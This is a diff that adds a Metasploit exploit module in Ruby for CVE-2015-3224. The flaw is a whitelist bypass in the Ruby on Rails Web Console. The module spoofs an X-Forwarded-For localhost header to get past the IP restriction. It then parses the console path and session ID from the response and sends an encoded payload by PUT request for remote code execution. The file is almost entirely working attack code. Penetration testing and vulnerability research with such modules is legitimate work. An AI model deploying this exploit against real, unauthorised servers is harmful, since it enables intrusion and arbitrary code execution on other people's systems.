@@ -1,0 +1,107 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution',
+      'Description'    => %q{
+          This module exploits an IP whitelist bypass vulnerability in the developer
+        web console included with Ruby on Rails 4.0.x and 4.1.x. This module will also
+        achieve code execution on Rails 4.2.x if the attack is launched from a
+        whitelisted IP range.
+      },
+      'Author'         => [
+        'joernchen <joernchen[at]phenoelit.de>', # Discovery & disclosure
+        'Ben Murphy <benmmurphy@gmail.com>',     # Discovery & disclosure
+        'hdm'                                    # Metasploit module
+      ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2015-3224' ],
+          [ 'URL', 'http://openwall.com/lists/oss-security/2015/06/16/18' ],
+          [ 'URL', 'https://groups.google.com/forum/message/raw?msg=rubyonrails-security/lzmz9_ijUFw/HBMPi4zp5NAJ' ],
+          [ 'URL', 'https://hackerone.com/reports/44513' ]
+        ],
+      'Platform'       => 'ruby',
+      'Arch'           => ARCH_RUBY,
+      'Privileged'     => false,
+      'Targets'        => [ ['Automatic', {} ] ],
+      'DefaultOptions' => { 'PrependFork' => true },
+      'DisclosureDate' => 'Jun 16 2015',
+      'DefaultTarget' => 0))
+
+    register_options(
+      [
+        Opt::RPORT(3000),
+        OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', '/missing404' ])
+      ], self.class)
+  end
+
+  #
+  # Identify the web console path and session ID, then inject code with it
+  #
+  def exploit
+    res = send_request_cgi({
+      'uri'     => normalize_uri(target_uri.path),
+      'method'  => 'GET',
+      'headers' => {
+        'X-Forwarded-For' => '0000::1'
+      }
+    }, 25)
+
+    unless res
+      print_error("Error: No response requesting #{datastore['TARGETURI']}")
+      return
+    end
+
+    web_console_path = nil
+
+    # Support vulnerable Web Console versions
+    if res.body.to_s =~ /data-remote-path='([^']+)'/
+      web_console_path = "/" + $1
+    end
+
+    # Support newer Web Console versions
+    if web_console_path.nil? && res.body.to_s =~ /data-mount-point='([^']+)'/
+      web_console_mount = $1
+      unless res.body.to_s =~ /data-session-id='([^']+)'/
+        print_error("Error: No session id found requesting #{datastore['TARGETURI']}")
+        return
+      end
+      web_console_path = normalize_uri(web_console_mount, 'repl_sessions', $1)
+    end
+
+    unless web_console_path
+      if res.body.to_s.index('Application Trace') && res.body.to_s.index('Toggle session dump')
+        print_error('Error: The web console is patched, disabled, or you are not in the whitelisted scope')
+      else
+        print_error("Error: No web console path found when requesting #{datastore['TARGETURI']}")
+      end
+      return
+    end
+
+    print_status("Sending payload to #{web_console_path}")
+    res = send_request_cgi({
+      'uri'       => web_console_path,
+      'method'    => 'PUT',
+      'headers'   => {
+        'X-Forwarded-For'  => '0000::1',
+        'Accept'           => 'application/vnd.web-console.v2',
+        'X-Requested-With' => 'XMLHttpRequest'
+      },
+      'vars_post' => {
+        'input' => payload.encoded
+      }
+    }, 25)
+  end
+end
